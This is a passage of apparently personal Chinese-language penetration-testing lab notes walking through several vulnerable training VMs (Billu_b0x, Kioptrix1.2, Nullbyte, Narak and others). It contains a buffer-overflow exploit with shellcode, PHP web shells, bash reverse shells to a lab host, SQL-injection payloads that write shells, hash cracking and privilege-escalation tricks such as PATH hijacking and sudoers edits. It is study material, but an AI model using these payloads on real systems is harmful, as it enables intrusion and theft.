![image-20250201203918595](靶场攻击1/image-20250201203918595.png)	

```python
然后修改payload为exp7.py:
#!/usr/bin/python                                        
import socket                                   
import time                                    
import sys                       
#set payload(windows_reverse_shell) for windows                         
try:                                                                
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
        s.connect(("10.10.10.133",9999))                    
        shellcode = ("\xda\xdc\xd9\x74\x24\xf4\xbe\xae\x5e\x82\xa8\x5b\x31\xc9"
		"\xb1\x12\x31\x73\x17\x03\x73\x17\x83\x6d\x5a\x60\x5d\x40"
		"\xb8\x93\x7d\xf1\x7d\x0f\xe8\xf7\x08\x4e\x5c\x91\xc7\x11"
		"\x0e\x04\x68\x2e\xfc\x36\xc1\x28\x07\x5e\xd8\xc0\xfd\x1e"
		"\xb4\xd6\x01\x17\x6c\x5e\xe0\x97\x08\x30\xb2\x84\x67\xb3"
		"\xbd\xcb\x45\x34\xef\x63\x38\x1a\x63\x1b\xac\x4b\xac\xb9"
		"\x45\x1d\x51\x6f\xc5\x94\x77\x3f\xe2\x6b\xf7") 
        buffer = 'A' * 524 + '\xf3\x12\x17\x31' + '\x90' * 16 + shellcode     
        print "\n[+]Send evil buffer many bytes(524 A, pos jmp ESP, 16 NOP, shellcode),including payload:Linux_reverse_shell."
        s.send(buffer)                         
        s.close()                                 
        time.sleep(2) 
except:
        print "\n[+] Could not connect,error!\n"       
        sys.exit()
```

```
kali监听后，运行这个exp7.py，那么linux即可获得shell.
```

![image-20250201204211742](靶场攻击1/image-20250201204211742.png)	

```
接下来提权环节，查看sudo命令，发现该用户能以root执行一个anansi_util文件。
```

![image-20250201204314959](靶场攻击1/image-20250201204314959.png)	

```
执行这个文件，会获得三个action，其中使用network是获得ip地址，第二个是获得进程列表信息，第三个是查看手册
sudo /home/anansi/bin/anansi_util
```

![image-20250201204421646](靶场攻击1/image-20250201204421646.png)	

```
那么就使用手册查看whoami命令。但是手册里面其实也可以执行命令，于是在里面输入!/bin/bash即可提权到root.
sudo /home/anansi/bin/anansi_util manual whoami
```

![image-20250201204605315](靶场攻击1/image-20250201204605315.png)	

# Billu_b0x

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24  
```

![image-20250202110025707](靶场攻击1/image-20250202110025707.png)	

```
对靶机的ip进行端口扫描，发现只开放了ssh和80端口
nmap --min-rate 10000 -p- 10.10.10.134
```

![image-20250202110056130](靶场攻击1/image-20250202110056130.png)	

```
对开放端口的服务版本和操作系统进行探测
nmap -sT -sV -O -p22,80 10.10.10.134
```

![image-20250202110215201](靶场攻击1/image-20250202110215201.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞,并无扫描出什么漏洞，只枚举出两个目录
nmap --script=vuln -p22,80 10.10.10.134
```

![image-20250202110400571](靶场攻击1/image-20250202110400571.png)	

```
访问web界面，里面提示说可以使用sql注入，于是我使用万能密码进行尝试但是无法成功
1' or 1=1#
```

![image-20250202110431512](靶场攻击1/image-20250202110431512.png)	

```
对网页进行目录爆破扫描
gobuster dir -u http://10.10.10.134/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250202110742465](靶场攻击1/image-20250202110742465.png)	

```
根据目录扫描访问,/images里面存放的是图像,/c里面是空白网页,/add网页存放的是上传图片的地方，但是经过测试无法直接上传图片,/show也是一片空白的页面,/test是一个网页,里面提示可以使用file参数,于是可想象能进行文件包含漏洞,/in显示了php的版本信息,/uploaded_images是上传图片保存的路径,而访问/panel会重定向到网页的初始界面,估计是需要登录进去才能访问panel
```

```
首先对/test网页进行file参数的文件包含，但是发现并不任何反应,说明这个参数很可能不是GET请求，而是POST请求
```

![image-20250202111613832](靶场攻击1/image-20250202111613832.png)	

```
使用curl让file参数进行POST请求，那么可通过文件包含获得passwd的文件信息
curl -X POST --data "file=/etc/passwd" http://10.10.10.134/test
```

![image-20250202111741611](靶场攻击1/image-20250202111741611.png)	

```
但由于用于权限比较低，无法直接读取shadow文件的内容
```

![image-20250202111842474](靶场攻击1/image-20250202111842474.png)	

```
由于权限过低无法访问敏感文件，但是可以使用这个文件包含访问php文件的源码信息，首先访问test源码信息，可以查看到里面后端数据库怎么进行sql拼接的。其中前两句会把用户传入的内容进行单引号的过滤，所以我们直接使用万能密码就会出错。
curl -X POST --data "file=./index.php" http://10.10.10.134/test
```

![image-20250202112400513](靶场攻击1/image-20250202112400513.png)	

```
再查看c.php的源码，发现存在一个数据库连接的账号密码，但是无法使用该账号进行ssh登录成功。
```

![image-20250202115527909](靶场攻击1/image-20250202115527909.png)	

```
再查看panel.php的源码信息，能够发现panel.php实际上可以通过参数load控制其中的文件包含的文件。
curl -X POST --data "file=./panel.php" http://10.10.10.134/test
```

![image-20250202115721254](靶场攻击1/image-20250202115721254.png)	

```
于是可以使用这个payload进行万能密码注入
or 1=1 #\
```

![image-20250202115358858](靶场攻击1/image-20250202115358858.png)	

```
登陆后，里面也存在上传点，于是可以尝试上传一个图片马文件
```

![image-20250202120247505](靶场攻击1/image-20250202120247505.png)	

```
随便下载网页的一个图片，然后在里面添加一段php的一句话木马。
<?php system($_GET['hsw']); ?>
```

![image-20250202120141802](靶场攻击1/image-20250202120141802.png)	

```
上传图片马
```

![image-20250202120406140](靶场攻击1/image-20250202120406140.png)	

```
也确实确定了图片马的在靶机的路径
```

![image-20250202120428246](靶场攻击1/image-20250202120428246.png)	

```
使用bp抓panel.php的包，尝试配合文件包含图片马来实现远程代码执行，发现确实可以远程代码执行
首先使用load参数包含图片马
load=./uploaded_images/jack.jpg
然后配合hsw参数使用图片马进行远程代码执行
?hsw=whoami
```

![image-20250202120948157](靶场攻击1/image-20250202120948157.png)	

```
首先kali建立监听
nc -lvnp 1234
于是尝试传入php的反弹shell
php -r '$sock=fsockopen("10.10.10.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
发现直接使用bp发送无法触发反弹shell的执行，所以怀疑可能url编码的问题
```

![image-20250202121322273](靶场攻击1/image-20250202121322273.png)	

```
右键点击convert selection中的url中的url-encode key characters
```

![image-20250202121406749](靶场攻击1/image-20250202121406749.png)	

```
url编码后再次点击send，此时就可以获得shell了
```

![image-20250202121504998](靶场攻击1/image-20250202121504998.png)	

![image-20250202121535293](靶场攻击1/image-20250202121535293.png)	

```
接下来是提权环节，由于是反弹shell并不知道该用户的密码，sudo提权暂时放弃，于是查看是否有敏感文件，发现phpmyadmin配置文件中具有数据库的root密码。
```

![image-20250202121825828](靶场攻击1/image-20250202121825828.png)	

```
根据以往运维人员会重用密码的情况，尝试使用这个密码进行提权操作,于是发现密码是可以登陆的，于是顺利获得root权限
ssh root@10.10.10.134
```

![image-20250202121958733](靶场攻击1/image-20250202121958733.png)	

# Kioptrix1.2

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24 
```

![image-20250202225423062](靶场攻击1/image-20250202225423062.png)	

```
根据靶机ip进行端口扫描,发现80和22端口是开放的。
nmap --min-rate 10000 -p- 10.10.10.135
```

![image-20250202225508090](靶场攻击1/image-20250202225508090.png)	

```
根据开放端口检测版本号和操作系统信息
nmap -sT -sV -O -p22,80 10.10.10.135
```

![image-20250202225919126](靶场攻击1/image-20250202225919126.png)	

```
首先根据优先级，肯定是要对80端口进行渗透，访问这个登录页面，发现是LotusCMS系统
```

![image-20250202230122035](靶场攻击1/image-20250202230122035.png)	

```
根据这个网站进行目录扫描，访问phpmyadmin目录里面是一个php数据库的后台管理页面
```

![image-20250202230554429](靶场攻击1/image-20250202230554429.png)	

```
接下来根据lotusCMS在github上寻找可利用的漏洞，由于searchsploit查找的利用漏洞中有一个是使用xss和csrf所构成的漏洞，漏洞利用起来需要一定的条件较为复杂，所以在github搜寻现有的漏洞文件
```

![image-20250202230740192](靶场攻击1/image-20250202230740192.png)	

```
查看这个文件，里面告诉了使用的方法。
```

![image-20250202231346582](靶场攻击1/image-20250202231346582.png)	

```
首先kali建立监听
nc -lvnp 1234
```

```
然后运行这个漏洞文件,输入监听的ip和端口
./lotusRCE.sh 10.10.10.135 /
```

![image-20250202231504539](靶场攻击1/image-20250202231504539.png)	

```
获得了初级用户的shell.
```

![image-20250202231614703](靶场攻击1/image-20250202231614703.png)	

```
提权环节由于不知道密码，无法使用sudo路线提权，查看计划任务也发现也无提权的可能，于是只能查看敏感文件。在网站根目录找到一个数据库连接的root密码。
```

![image-20250202231856579](靶场攻击1/image-20250202231856579.png)	

```
使用ssh尝试看看能不能直接作为root密码登录,但是发现无法登录成功。
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@10.10.10.135
```

![image-20250202232029380](靶场攻击1/image-20250202232029380.png)	

```
于是使用这个root的数据库密码，来连接mysql数据库
mysql -uroot -p
```

![image-20250202232207855](靶场攻击1/image-20250202232207855.png)	

```
发现其中一个表存在两个用户和密码hash
```

![image-20250202232314079](靶场攻击1/image-20250202232314079.png)	

```
另一个表也有一个用户和密码(n0t7t1k4)，这个很明显与gallarific的后台管理有关。
```

![image-20250202232349150](靶场攻击1/image-20250202232349150.png)	

```
虽然该表的密码确实能够登录到这个后台，但是这个后台系统内部并无什么可以渗透的点
```

![image-20250202232710231](靶场攻击1/image-20250202232710231.png)	

```
接下来把第一张表的hash值进行判断，发现是md5类型
hash-identifier 0d3eccfb887aabd50f243b3f155c0f85
```

![image-20250202232928277](靶场攻击1/image-20250202232928277.png)	

```
将两个hash值存放到creds文件中，然后使用john进行暴力碰撞出明文密码
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt creds
```

![image-20250202233232095](靶场攻击1/image-20250202233232095.png)	

```
将用户名存放到user.lst,明文密码存放到pass.lst，然后使用密码喷洒攻击
crackmapexec ssh 10.10.10.135 -p pass.lst -u user.lst --continue-on-success
```

![image-20250202233557964](靶场攻击1/image-20250202233557964.png)	

```
然后登录用户，经过测试，发现loneferret用户能够使用sudo提权，而另一个用户既不能sudo也不能定时计划任务提权
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss loneferret@10.10.10.135
然后查看该用户可以sudo执行两个命令
```

![image-20250202233950413](靶场攻击1/image-20250202233950413.png)	

```
其中第一个不是su命令，所以不能直接sudo提权，而ht是一个编辑器，可以通过打开编辑器ht来编辑/etc/sudoers来给普通用户执行其他的命令。
在执行该命令之前可能会遇到'xterm-256color': unknown terminal type错误，需要导入环节变量
export TERM=xterm-color
sudo /usr/local/bin/ht
进入后点击F3，然后在name中输入要编辑的文件
```

![image-20250202234658529](靶场攻击1/image-20250202234658529.png)	

```
添加这一段，这样该用户就能执行sudo任意命令
loneferret ALL=(ALL)NOPASSWD:ALL
```

![image-20250202235016888](靶场攻击1/image-20250202235016888.png)		

```
然后按F10退出，再次运行sudo -l查看权限，可以看到已经有ALL权限了，于是即可顺利提权。
```

![image-20250202235053274](靶场攻击1/image-20250202235053274.png)	

# BNE0x03Simple

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24  
```

![image-20250203005208304](靶场攻击1/image-20250203005208304.png)	

```
根据靶机的ip，扫描开放的端口
nmap --min-rate 10000 -p- 10.10.10.136
```

![image-20250203005243977](靶场攻击1/image-20250203005243977.png)	

```
根据开放的端口检测版本号和操作系统信息
nmap -sT -sV -O -p80 10.10.10.136
```

![image-20250203005353464](靶场攻击1/image-20250203005353464.png)	

```
使用nmap脚本扫描开放端口是否有可利用漏洞，并无发现什么有效信息，很多都是dos攻击
nmap --script=vuln -p80 10.10.10.136
```

![image-20250203010251105](靶场攻击1/image-20250203010251105.png)	

```
由于只开放一个端口，进行粗略的网页访问，里面是一个CuteNews内容管理系统
```

![image-20250203010119468](靶场攻击1/image-20250203010119468.png)	

```
根据这个内容管理系统寻找对应的漏洞文件,发现存在任意文件上传的漏洞
searchsploit CuteNews 2.0.3
```

![image-20250203010208817](靶场攻击1/image-20250203010208817.png)	

```
下载这个漏洞文件,并查看该文件，这个文件中告诉了步骤，注册用户登录，然后在里面上传php文件即可，并且也提示了对应上传文件的路径。
searchsploit CuteNews 2.0.3 -m 37474
```

![image-20250203010448179](靶场攻击1/image-20250203010448179.png)	

```
于是注册用户
```

![image-20250203010553028](靶场攻击1/image-20250203010553028.png)	

![image-20250203010613015](靶场攻击1/image-20250203010613015.png)	

```
点击personal options
```

![image-20250203010629220](靶场攻击1/image-20250203010629220.png)	

```
将shell.php上传上去
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'");?>
```

![image-20250203010756448](靶场攻击1/image-20250203010756448.png)	

```
其实通过文件目录扫描也能得知该文件的目录是uploads，于是找到了上传的木马文件位置
```

![image-20250203010820797](靶场攻击1/image-20250203010820797.png)	

```
kali进行监听，然后点击这个木马文件进行访问即可获得shell.
nc -lvnp 1234
```

![image-20250203010935940](靶场攻击1/image-20250203010935940.png)	

```
由于不知道该用户的密码，所以无法进行sudo提权，然后定时计划任务经过查看并无提权可能。于是尝试内核提权，先查看内核版本信息
```

![image-20250203011802367](靶场攻击1/image-20250203011802367.png)	

```
然后根据内核版本寻找对应的提权漏洞并下载，这里尝试了很多内核提权漏洞很多都不行
可以根据内核版本和发行版本来查找内核提权漏洞
searchsploit kernel 3.16.0-generic |grep "Privilege Escalation"
searchsploit Ubuntu 14.04 |grep "Privilege Escalation" 
```

![image-20250203015049372](靶场攻击1/image-20250203015049372.png)		

```
经过测试发现这个37088是可以提权的，下载下来
searchsploit Ubuntu 14.04  -m 37088   
```

![image-20250203014249016](靶场攻击1/image-20250203014249016.png)	

```
把该漏洞提权文件下载到靶机，查看这个文件得知使用方式后，编译后执行即可获得root权限
gcc 37088.c -o 37088
./37088
```

![image-20250203015258377](靶场攻击1/image-20250203015258377.png)		

# Nullbyte

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24  
```

![image-20250205122530544](靶场攻击1/image-20250205122530544.png)	

```
对靶机的ip进行端口扫描,发现四个端口是开放的
nmap --min-rate 10000 -p- 10.10.10.138
```

![image-20250205122626414](靶场攻击1/image-20250205122626414.png)	

```
根据开放端口检测服务版本号以及操作系统信息,发现777端口是ssh服务，80是web服务，而111和44976是RPC服务
nmap -sT -sC -sV -O -p80,111,777,44976 10.10.10.138
```

![image-20250205122734539](靶场攻击1/image-20250205122734539.png)	

```
对靶机的UDP端口进行扫描
nmap -sU -p80,111,777,48572 10.10.10.138
```

![image-20250205122846448](靶场攻击1/image-20250205122846448.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞
nmap --script=vuln -p80,111,777,48572 10.10.10.138
```

![image-20250205144002153](靶场攻击1/image-20250205144002153.png)	

```
于是根据优先级，先对web进行渗透，首先访问网页和查看源码后并无有效信息。
```

![image-20250205122946324](靶场攻击1/image-20250205122946324.png)	

```
那么只能对网页进行目录扫描,但是访问几个目录后，仅发现只有/phpmyadmin能够访问，里面是一个phpmyadmin的后台登陆系统。
gobuster dir -u http://10.10.10.138/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250205123222685](靶场攻击1/image-20250205123222685.png)	

```
由于不知道密码，所以暂时没有头绪，于是把默认网页比较显眼的图片下载下来，看是否存在数据隐写
```

![image-20250205123416600](靶场攻击1/image-20250205123416600.png)	

```
经过发现，感觉comment字段可能是隐写的内容,那么一般来说只有几种可能，要么是密码，要么是url路径。首先密码经过碰撞phpmyadmin的后台登录系统，和ssh登录root都失败了。
exiftool main.gif
```

![image-20250205123514393](靶场攻击1/image-20250205123514393.png)	

```
于是当作url路径访问，发现成功，里面存在一个输入框
```

![image-20250205123856773](靶场攻击1/image-20250205123856773.png)	

```
查看源码得知，这个密码验证并未连接数据库，但是有提示密码并不复杂，那么说明可以使用弱密码爆破
```

![image-20250205123951693](靶场攻击1/image-20250205123951693.png)	

```
使用hydra进行http表单密码爆破，破解出密码是elite
指定以http表单爆破密码,写下URL路径,其中爆破的字段需要使用^^包含,第二个:的内容表示爆破失败的内容提示,由于这个爆破虽然不需要账号，但是hydra必须指定，于是使用-l随便指定一个用户名
hydra 10.10.10.138 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l hsw -P /usr/share/wordlists/rockyou.txt
```

![image-20250205124818361](靶场攻击1/image-20250205124818361.png)	

```
根据密码登录后，里面又存在一个查询框，首先传入单引号没有出错，然后换成双引号结果出现sql报错，说明存在sql注入
```

![image-20250205140745448](靶场攻击1/image-20250205140745448.png)	

```
于是使用orderby确定有多少个列
" order by 3--+
于是使用联合查询，发现有三个回显点
" union select 1,2,3--+
```

![image-20250205141146079](靶场攻击1/image-20250205141146079.png)	

```
查看数据库版本、用户、以及当前使用的数据库,能够确定的是当前数据库是root用户，使用的数据库是seth
" union select version(),user(),database()--+
```

![image-20250205141340401](靶场攻击1/image-20250205141340401.png)	

```
查看当前数据库存在的表有哪些，发现只有一个users表
" union select group_concat(0x20,table_name,0x20),2,3 from information_schema.tables where table_schema=database()--+
```

![image-20250205141744623](靶场攻击1/image-20250205141744623.png)	

```
查看users表项中存在哪些lie
" union select group_concat(0x20,column_name,0x20),2,3 from information_schema.columns where table_name="users"--+
```

![image-20250205142108782](靶场攻击1/image-20250205142108782.png)	

```
经过users表查询，仅发现ramses用户存在密码,初步判断感觉这个像base64加密
" union select group_concat(0x20,id,0x20,user,0x20,pass,0x20),2,3 from seth.users --+
```

![image-20250205142522742](靶场攻击1/image-20250205142522742.png)	

```
于是把将其复制下来进行base64解码,得到一串hash值(c6d6bd7ebf806f43c76acc3681703b81)
echo -n 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE'|base64 -d
```

![image-20250205142804617](靶场攻击1/image-20250205142804617.png)	

```
接下来就判断这个hash值的类型,检测出是md5类型。
hash-identifier c6d6bd7ebf806f43c76acc3681703b81
```

![image-20250205142904815](靶场攻击1/image-20250205142904815.png)	

```
将这串hash保存到一个文件中，然后使用john碰撞出明文密码(omega)
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt creds
```

![image-20250205143330192](靶场攻击1/image-20250205143330192.png)	

```
由于ssh是777端口，不是默认端口需要使用-p参数指定。
ssh rames@10.10.10.138 -p 777
```

![image-20250205143356096](靶场攻击1/image-20250205143356096.png)	

```
接下来不进行提权，继续来使用其他的sql注入方式进行攻击，由于当前数据库是root，那么可以尝试写入一句话木马。
" union select "<?php system($_GET['hsw']);?>",2,3 into outfile '/var/www/html/uploads/shell.php'--+
```

![image-20250205144319382](靶场攻击1/image-20250205144319382.png)	

```
由于每次使用username查询，返回结果会是420search.php，于是怀疑这个文件可能存在数据库配置信息。根据写好的一句话木马进行查看，于是得到数据库的root密码(sunnyvale)
curl http://10.10.10.138/uploads/shell.php?hsw=cat%20/var/www/html/kzMb5nVYJw/420search.php
```

![image-20250205144947424](靶场攻击1/image-20250205144947424.png)	

```
但是得知了数据库的root密码，可以直接访问phpmyadmin直接登录后台系统，获取users表的数据，那么自然而然就可以使用base64解密加john破解出这个密码hash值。
```

![image-20250205145112911](靶场攻击1/image-20250205145112911.png)	

```
还有一种攻击方式是直接写入反弹shell，这样kali监听即可获得初级用户的shell.
" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'\");?>",2,3 into outfile '/var/www/html/uploads/reverse.php'--+
```

```
除此之外还可以使用sqlmap自动化注入攻击，根据注入点来查看有哪些数据库
sqlmap -u "http://10.10.10.138/kzMb5nVYJw/420search.php?usrtosearch=a" --dbms mysql --dbs
```

![image-20250205152629835](靶场攻击1/image-20250205152629835.png)	

```
根据指定数据库查看有哪些表
sqlmap -u "http://10.10.10.138/kzMb5nVYJw/420search.php?usrtosearch=a" --dbms mysql -D seth --tables
```

![image-20250205152732303](靶场攻击1/image-20250205152732303.png)	

```
再根据tables表查看有哪些列
sqlmap -u "http://10.10.10.138/kzMb5nVYJw/420search.php?usrtosearch=a" --dbms mysql -D seth -T users --columns
```

![image-20250205152806231](靶场攻击1/image-20250205152806231.png)	

```
然后导出users表的数据
sqlmap -u "http://10.10.10.138/kzMb5nVYJw/420search.php?usrtosearch=a" --dbms mysql -D seth -T users --dump
```

![image-20250205152836983](靶场攻击1/image-20250205152836983.png)	

```
sql注入攻击的几种方式讲完后，接下来就开始进一步的提权，首先查看sudo并无可执行的命令，并且计划任务也没有提权的可能，并且查看敏感文件仅仅得知mysql的root密码，但是这个密码经过碰撞并不是靶机root用户的密码。
于是只能查看history看看这个用户的行为，发现该用户执行了./procwatch文件。
```

![image-20250205150744961](靶场攻击1/image-20250205150744961.png)	

```
于是看看这个文件的权限，发现该文件存在suid权限，即当执行的时候会以文件所有者的权限执行，那么会以root身份去运行。
ls -liah
```

![image-20250205150826971](靶场攻击1/image-20250205150826971.png)	

```
执行这个文件,发现就是执行了ps命令。
./procwatch
```

![image-20250205150931457](靶场攻击1/image-20250205150931457.png)	

```
由于是root身份执行，那么自然的，可以在当前目录设置一个软链接，这样执行该文件的时候，就会触发执行/bin/sh从而获得root的shell.
ln -s /bin/sh ps
但是光这样还不够，必须添加环境变量，将当前目录的路径添加为PATH环境变量的第一个，这样找ps命令的时候，会默认先到该路径先找，这叫做环境变量劫持。
export PATH=.:$PATH
可以查看PATH环境变量是否有添加成功
echo $PATH
再次执行该文件，即可提权到root
./procwatch
```

![image-20250205151429067](靶场攻击1/image-20250205151429067.png)	

```
当然也要总结一下，当提权又找不到地方的时候，可以查看history判断用户行为，看能否提权，或者说查找suid权限的文件来尝试提权
find / -perm -u=s -type f 2>/dev/null
```

# FourandSix2.01

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24 
```

![image-20250205173443019](靶场攻击1/image-20250205173443019.png)	

```
根据靶机的ip进行端口扫描
nmap --min-rate 10000 -p- 10.10.10.139
```

![image-20250205173754384](靶场攻击1/image-20250205173754384.png)	

```
对开放端口的服务版本和操作系统进行探测
nmap -sT -sC -sV -O -p22,111,959,2049 10.10.10.139 
```

![image-20250205173856846](靶场攻击1/image-20250205173856846.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞
nmap --script=vuln -p22,111,959,2049 10.10.10.139
```



```
根据开放的端口得知有一个nfs和ssh服务，那么根据优先级先对nfs共享服务进行渗透测试
查询NFS服务器的共享目录有哪些，结果发现一个共享目录,任何人都可以访问
showmount -e 10.10.10.139
```

![image-20250205174009498](靶场攻击1/image-20250205174009498.png)	

```
于是新建一个目录，并进行挂载
mount -t nfs 10.10.10.139:/home/user/storage nfs_share
```

![image-20250205174153339](靶场攻击1/image-20250205174153339.png)	

```
发现里面存在一个7z压缩包。将其复制下来查看文件类型，并查看是否有捆绑，发现无捆绑
file backup.7z
binwalk backup.7z
```

![image-20250205174215113](靶场攻击1/image-20250205174215113.png)	

![image-20250205174521342](靶场攻击1/image-20250205174521342.png)	

```
那么进行解压，结果发现需要密码才行,由于不知道密码，那么就会解压失败。
7z x backup.7z
```

![image-20250205174254489](靶场攻击1/image-20250205174254489.png)	

```
那么接下来就需要破解这个7z压缩包的密码。先把这7z文件生成对应的hash，然后使用john破解
7z2john backup.7z > backup_hash
```

![image-20250205174646192](靶场攻击1/image-20250205174646192.png)	

```
使用john破解
john --format=7z --wordlist=/usr/share/wordlists/rockyou.txt backup_hash 
```

![image-20250205174736704](靶场攻击1/image-20250205174736704.png)	

```
于是根据密码正确解压成功
7z x backup.7z 
```

![image-20250205174817489](靶场攻击1/image-20250205174817489.png)	

```
首先解压出八张图片和疑似ssh的公钥私钥文件，首先查看八张图片的类型，确认是图片类型
file hello*.*
```

![image-20250205174904043](靶场攻击1/image-20250205174904043.png)	

```
查看八张图片是否有捆绑,发现都无捆绑。
binwalk hello*.*
```

![image-20250205175017209](靶场攻击1/image-20250205175017209.png)	

```
接下来查看八张图片是否存在隐写内容，经过查看并没有隐写。
exiftool hello*.*
```

```
在使用file查看另外两个文件，发现一个是ssh公钥一个是ssh私钥文件
file id_rsa id_rsa.pub
```

![image-20250205175212651](靶场攻击1/image-20250205175212651.png)	

```
查看公钥的内容发现了此用户的用户名user.
```

![image-20250205175232436](靶场攻击1/image-20250205175232436.png)	

```
于是直接使用私钥进行ssh免密登录，发现需要输入passphrase，这说明私钥被加密了，需要输入加密的密码才能够免密登录成功，
ssh -i id_rsa user@10.10.10.139    
```

![image-20250205175323318](靶场攻击1/image-20250205175323318.png)	

```
于是要破解私钥的加密密码，先把私钥文件转换为hash值
ssh2john id_rsa > rsa_hash
然后破解其中的hash得到私钥文件加密的明文密码(12345678)
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash 
```

![image-20250205175938545](靶场攻击1/image-20250205175938545.png)	

```
于是再次尝试免密登录，输入私钥加密的密码，于是即可登录上去
ssh -i id_rsa user@10.10.10.139
```

![image-20250205180100086](靶场攻击1/image-20250205180100086.png)	

```
查看系统内核，发现操作系统是OpenBSD,该操作系统并没有sudo，也没有crontab计划任务，所以可以查找suid权限的文件。
uname -a
查看所属user用户组的文件有哪些
find / -group user -type f 2>/dev/null
查看有哪些suid权限的文件,发现doas具有suid权限，这是openBSD系统的提权方式
find / -perm -u=s -type f 2>/dev/null
```

![image-20250205191715062](靶场攻击1/image-20250205191715062.png)	

![image-20250205191928095](靶场攻击1/image-20250205191928095.png)	

```
doas命令并不怎么了解，经过网页查找，发现这个类似sudo命令，于是查看它的配置文件，看该用户能用doas执行哪些命令,发现能doas执行less命令，但是参数固定是/var/log/authlog，但是不影响我们提权
cat /etc/doas.conf  
```

![image-20250205192051336](靶场攻击1/image-20250205192051336.png)	

```
执行该命令，less查看这个文件，然后使用v进入vi的编辑模式，在:sh来得到root的shell
doas /usr/bin/less /var/log/authlog   
```

![image-20250205192251785](靶场攻击1/image-20250205192251785.png)	

```
于是顺利提权成功。
```

![image-20250205192351352](靶场攻击1/image-20250205192351352.png)	

# Narak

```
扫描c段确定靶机ip
nmap -sn 10.10.10.0/24
```

![image-20250208012023368](靶场攻击1/image-20250208012023368.png)	

```
扫描端口，得知开放的有80和22端口
nmap --min-rate 10000 -p- 10.10.10.140
```

![image-20250208012147445](靶场攻击1/image-20250208012147445.png)	

```
根据开放的端口，检测版本服务以及操作系统信息
nmap -sT -sV -O -p22,80 10.10.10.140
```

![image-20250208012324013](靶场攻击1/image-20250208012324013.png)	

```
使用nmap的脚本扫描开放端口是否有可利用漏洞,经结果得知没有什么能利用的漏洞。
nmap --script=vuln -p22,80 10.10.10.140
```

![image-20250208013612291](靶场攻击1/image-20250208013612291.png)	

```
基于80端口的优先级先进行渗透，仅发现网页只有图片，并无有效信息，查看源码也无有效信息，并且下载图片使用exif查看图片是否有隐写，也无隐写内容。
```

![image-20250208012553481](靶场攻击1/image-20250208012553481.png)	

```
于是只能对网站进行目录爆破扫描
gobuster dir -u http://10.10.10.140/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250208012811469](靶场攻击1/image-20250208012811469.png)	

```
经过首轮的扫描，分别访问了/webdav里面是一个登录验证框，而/server-status访问显示权限不够。
```

![image-20250208012857222](靶场攻击1/image-20250208012857222.png)	

```
由于不知道密码，那么也没有可能进行下去，于是只能尝试对网站进行进一步仔细的扫描，分别对指定的后缀进行扫描，看能否扫描出一些文件。此时会多扫描出一个tips.txt文件
gobuster dir -u http://10.10.10.140/ -x rar,zip,txt,sql -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250208013302000](靶场攻击1/image-20250208013302000.png)	

```
于是访问这个tips.txt文件，里面提示要打开这个靶机的大门，一定需要creds.txt文件。直接通过网页访问/creds.txt是不存在的，说明没有那么容易访问到。
```

![image-20250208013336832](靶场攻击1/image-20250208013336832.png)	

```
当要一筹莫展的时候，就应该想到扫描UDP端口，发现tftp有可能是开放状态。
nmap -sU --top-ports 20 10.10.10.140
```

![image-20250208013648046](靶场攻击1/image-20250208013648046.png)	

```
于是访问tftp服务器,发现能够进去，但是由于这个tftp是简陋版的ftp，是不能列出里面的文件信息，所以只能尝试get一个不存在的文件，来暴露其他的文件，但是经过尝试也不行。
tftp 10.10.10.140
```

![image-20250208013810934](靶场攻击1/image-20250208013810934.png)	

```
于是根据之前tips.txt的提示，发现能够下载creds.txt文件，并且经过发现是base64编码的。
```

![image-20250208013849725](靶场攻击1/image-20250208013849725.png)	

![image-20250208013937099](靶场攻击1/image-20250208013937099.png)	

```
于是将其base64解码查看里面真实的内容，发现可能是账号和密码(yamdoot:Swarg )
cat creds.txt | base64 -d 
```

![image-20250208014033671](靶场攻击1/image-20250208014033671.png)	

```
然后进行ssh登录失败后，于是可以想到这个账号密码去尝试用在webdav上。于是登录成功，但是里面并没有文件。
```

![image-20250208014148908](靶场攻击1/image-20250208014148908.png)	

```
那么接下来就查看这个webdav服务的权限是怎么样的，所以需要扫描以下,结果发现php后缀的文件是可以put上传上去的，并且php是具备执行权限的。
davtest -url http://10.10.10.140/webdav/ -auth yamdoot:Swarg
```

![image-20250208014502716](靶场攻击1/image-20250208014502716.png)	

```
于是写好一个反弹shell.php上传上去。php文件的内容如下。
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1 '"); ?>
使用客户端访问
cadaver http://10.10.10.140/webdav
然后上传反弹shell
put shell.php
```

![image-20250208014832675](靶场攻击1/image-20250208014832675.png)	

```
kali建立监听，然后网页点击shell.php触发反弹shell
nc -lvnp 1234
```

![image-20250208015014709](靶场攻击1/image-20250208015014709.png)	

![image-20250208015022979](靶场攻击1/image-20250208015022979.png)	

```
接下来就是提权环节，由于不知道该用户密码sudo无法提权，定时计划任务查看也无提权可能，查看网站根目录也并无发现敏感文件，于是只能尝试新的提权思路，这里搜寻该用户具有写权限的文件
find / -writable -type f 2>/dev/null
